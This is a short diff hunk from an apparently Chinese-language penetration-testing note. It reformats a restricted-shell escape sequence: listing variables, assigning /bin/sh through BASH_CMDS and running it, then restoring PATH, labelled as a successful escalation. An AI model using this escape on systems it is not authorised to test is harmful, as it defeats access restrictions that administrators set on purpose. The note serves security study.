@@ -60,10 +60,10 @@
 
 >expect
 >export -p        //查看环境变量
-BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
-/bin/bash
-export PATH=$PATH:/bin/         //添加环境变量
-export PATH=$PATH:/usr/bin      //添加环境变量
+>BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
+>/bin/bash
+>export PATH=$PATH:/bin/         //添加环境变量
+>export PATH=$PATH:/usr/bin      //添加环境变量
 
 提权成功
 
